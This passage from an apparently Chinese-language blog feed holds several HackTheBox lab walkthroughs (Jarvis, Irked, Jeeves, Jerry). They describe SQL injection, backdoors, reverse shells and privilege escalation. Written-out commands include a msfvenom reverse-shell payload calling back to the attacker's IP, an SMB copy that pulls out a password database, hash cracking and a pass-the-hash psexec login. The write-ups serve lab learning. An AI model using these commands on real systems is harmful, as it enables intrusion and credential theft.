<p>找着一个RCE漏洞，先下载到本地，在传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.1kq27wbzmxuo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Hawk/image.39khphhoncw0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Jarvis - HackTheBox</title>
    <url>/post/2f1fa5401cbd/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.1q2k46bbvsao.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.3k4634wt8no0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.5izv3fdqiw40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.2f5v8chza45c.webp"
                     
                ></p>
<p>访问80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.5dav0rf6zx80.webp"
                     
                ></p>
<p>像一个酒店的主页面</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.72twooq3x7g0.webp"
                     
                ></p>
<p>这里像是有注入点，尝试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.3c9rvisswk80.webp"
                     
                ></p>
<p>报错了，猜字段</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.650w54lhct80.webp"
                     
                ></p>
<p>字段为7</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.4n68gn9uieu0.webp"
                     
                ></p>
<p>回显点有了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.48xfn5kc9ji0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.7buu7jft6g80.webp"
                     
                ></p>
<p>这都是些啥</p>
<p>数据库中无可利用信息，猜一下路径，试试写入文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.4o1qrmz8yps0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.10kz0nbqedyo.webp"
                     
                ></p>
<p>可行，写一个后门进去</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.1wockr5ldsao.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.292l6bqhnri8.webp"
                     
                ></p>
<p>本地准备一个php反弹文件，让他下载执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.2bc7qh5s7d0k.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.2sdg5i6i9ag0.webp"
                     
                ></p>
<p>访问一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.7hyifzy627k0.webp"
                     
                ></p>
<p>提权</p>
<p>发现一个sudo文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.499jn3rimek0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.74zw3ahvltg0.webp"
                     
                ></p>
<p>尝试以pepper身份执行一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.wyia9cv9ya8.webp"
                     
                ></p>
<p>可以执行ping，那应该有了，先看看执行权限</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.2oowzbjl61i0.webp"
                     
                ></p>
<p>擦，怎么还是www</p>
<p>然后发现-p后不加参数的话，会输出这种情况，如果在这里让他运行一个反弹shell的脚本，权限会是谁</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.54awy02nus00.webp"
                     
                ></p>
<p>在本地准备一个反弹shell的脚本文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.5u2xs4c8ywo0.webp"
                     
                ></p>
<p>让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.3e393qmj0uo0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.nxh7spg884w.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.766q1cwpy2k0.webp"
                     
                ></p>
<p>继续提权</p>
<p>用linpeas检测了一波</p>
<p>有个suid，搜一下用法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.11tveiempqyo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.fobas3wqopk.webp"
                     
                ></p>
<p>在本地搞一个，再让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.5fy9u7yunjw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.5yf04xti3yo0.webp"
                     
                ></p>
<p>把文件转移到&#x2F;dev&#x2F;shm目录下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.101o97r84swg.webp"
                     
                ></p>
<p>然后利用systemctl命令去运行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.4kzgp60cfii0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.7g4n1cdkrow0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jarvis/image.7l2grtu9dzk0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Irked - HackTheBox</title>
    <url>/post/6aae709d142c/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.vv7y4nooeg0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.3hxlevilf7s0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.fzxkomcoswo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.pljhi0ljo0w.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.6nkks4jhpzs0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.2rfrv3v6pks0.webp"
                     
                ></p>
<p>扫下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.1x7nc6pycvi8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.1gpt877gewps.webp"
                     
                ></p>
<p>没什么可利用信息</p>
<p>端口这边看到一个不认识的，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.2x118m8hjxu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.xow9kcue7o0.webp"
                     
                ></p>
<p>貌似是个TCP传输协议，不知道有没有漏洞</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.1vilme1hmaqo.webp"
                     
                ></p>
<p>试试第一个</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.42zyq31zysu0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.5sim7km1ns00.webp"
                     
                ></p>
<p>搜一下exp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.7bki0k3e2ec0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.2m5xoa51kk60.png"
                     
                ></p>
<p>尝试利用</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.57fupxbrwk40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.46af04rekts0.webp"
                     
                ></p>
<p>第一遍没打进去，换了个端口就ok了</p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.7dzfzm3e89s0.webp"
                     
                ></p>
<p>下载pkexec的exp到攻击机，然后再让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.3vb30le4v240.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.5qkidprmmho0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.1qe6e2trwkgw.webp"
                     
                ></p>
<hr>
<p>还有一种提权方法是为官方的一个方法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.1c0qyy3kp5k0.webp"
                     
                ></p>
<p>在djmardov用户的根目录下可以找到一个隐藏的.backup文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.4p86j9n2rok0.webp"
                     
                ></p>
<p>这是一个隐写术的解密密码，隐写的图片为80端口的图片</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.zrj5ga8majk.webp"
                     
                ></p>
<p><code>steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg</code></p>
<p>提取图片中的隐写数据</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.4bxjq7xbs400.webp"
                     
                ></p>
<p>这一串应该就是djmardov用户的ssh密码了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.6cblevdyvzk0.webp"
                     
                ></p>
<p>之后上传检测工具检测提权方法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.x3j2c4a5y1c.webp"
                     
                ></p>
<p>也可利用脏牛提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.6tngnpk464k0.webp"
                     
                ></p>
<p>这边发现一个SUID的不认识的文件，看看是什么</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.4te54b1vtze0.webp"
                     
                ></p>
<p>貌似是个二进制文件，把他复制到攻击机上</p>
<p><code>scp djmardov@10.10.10.117:/tmp/viewuser .</code></p>
<p>看看运行情况</p>
<p><code>ltrace ./viewuser</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.wf0flws2c74.webp"
                     
                ></p>
<p>貌似是执行一个who命令，然后在将tmp目录下的listusers文件赋予suid0权限，在进行执行</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.xgx57hs0g0g.webp"
                     
                ></p>
<p>tmp目录下没有listusers文件，新建一个，内容为反弹shell</p>
<p>在攻击机上先写好，在让靶机下载</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.76ptpklnbrg0.webp"
                     
                ></p>
<p>给listusers添加执行权限，然后就是执行&#x2F;usr&#x2F;bin&#x2F;viewuser文件来触发反弹shell了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.2kfescetquw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Irked/image.zs4f3wjhck0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Jeeves - HackTheBox</title>
    <url>/post/c119cb5785fd/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.6jy41qlc7ec0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.4uumg39ow580.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.2k694obv7m00.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.3hs9zyylft80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.2f2m98lvy05c.webp"
                     
                ></p>
<p>不管输入什么都是跳转到error页面</p>
<p>换5000端口Jetty看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.79dj5uz5y280.webp"
                     
                ></p>
<p>扫下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.3an38cm3uvy0.webp"
                     
                ></p>
<p>Jenkins的cms</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.1wyhoimzvge8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.3mf2q7izlu80.webp"
                     
                ></p>
<p>在这里找到一个脚本控制台</p>
<p><code>https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/</code></p>
<p>可以RCE</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.421ej7c33ra0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.3q0unbxu3d40.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.1y2gtww1s9hc.webp"
                     
                ></p>
<p>貌似可以用烂土豆</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.6xj31rnd0ms0.webp"
                     
                ></p>
<p>win10专业版64位系统</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.3ooi752ujhk0.webp"
                     
                ></p>
<p>补丁打了一大堆</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.6am1z11mpkg0.webp"
                     
                ></p>
<p>在kohsuke目录下发现一个CEH.kdbx文件</p>
<p><code>https://www.reviversoft.com/zh-cn/file-extensions/kdbx</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.7leh864a79k0.webp"
                     
                ></p>
<p>该文件存储有账户密码，下载下来</p>
<p><code>impacket-smbserver test pwd</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.1b64kfuc4w0w.webp"
                     
                ></p>
<p>本地开一个SMB服务</p>
<p><code>net use s: \\10.10.14.11\test</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.675075l6zw00.webp"
                     
                ></p>
<p>靶机连接</p>
<p><code>copy CEH.kdbx s:</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.7dbbjbngzaw0.webp"
                     
                >在将文件copy过来</p>
<p>在本地的test目录下pwd文件夹中就会得到CEH.kdbx文件</p>
<p>打开文件</p>
<p><code>kpcli --kdb CEH.kdbx</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.6exfikyv6uc0.webp"
                     
                ></p>
<p>爆破一下</p>
<p><code>keepass2john CEH.kdbx &gt; CEH</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.63on8jorxq80.webp"
                     
                ></p>
<p><code>john --wordlist=/usr/share/wordlists/rockyou.txt CEH</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.60fo4n14g500.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.253f6bypnleo.webp"
                     
                ></p>
<p>一个个看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.4asvhvz0nd4.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.3eh4wnp67h60.webp"
                     
                ></p>
<p>第一个貌似是个哈希密码，第二个是bob用户的密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.5omztik81ww0.webp"
                     
                ></p>
<p>但是靶机上并没有bob这个用户，尝试用哈希登录</p>
<p><code>python psexec.py administrator@10.10.10.63 &#39;cmd.exe&#39; -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.6isutf5ytz00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.hwrbmb5w8f4.webp"
                     
                ></p>
<p>flag文件并不直接存在</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.14t3l3cvjwm8.webp"
                     
                ></p>
<p>用more查看</p>
<p><code>more &lt; hm.txt:root.txt</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.38zprwutvfe0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jeeves/image.2piukka30fs0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Jerry - HackTheBox</title>
    <url>/post/bb2b2522efd9/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.1p2tdzcl55z4.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.1ixdcjzbqj8g.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.6u981dk6d8o0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.320j8gmzn6g0.webp"
                     
                ></p>
<p>就一个8080的tomcat端口，访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.6rbrnrhediw0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.429a3y9cu040.webp"
                     
                ></p>
<p>猜一下弱口令</p>
<p>admin:admin跳转了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.35zb20ogqq40.webp"
                     
                ></p>
<p>貌似不对</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.5985etxj1dk0.webp"
                     
                ></p>
<p>错误页面爆出了默认密码，尝试一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.6b4gtz6lusw0.webp"
                     
                ></p>
<p>msf生成一个反弹shell的war包</p>
<p><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.17 LPORT=7777 -f war -o shell.war</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.447hhf1hp140.webp"
                     
                ></p>
<p>上传</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.6jfb0cpc2wg0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.2yg8hh9waau0.webp"
                     
                ></p>
<p>没找到root.txt和user.txt，只有一个这个2 for the price of 1.txt</p>
<p>直接读取读不出来</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.2glrah39d2kg.webp"
                     
                ></p>
<p>用通配符读取一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Jerry/image.5x0am4hskos0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Knife - HackTheBox</title>
    <url>/post/c33efacb7183/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.17pdfe6lpdr4.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.4u0vy2eqv760.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Knife/image.21e76vrbrfsw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
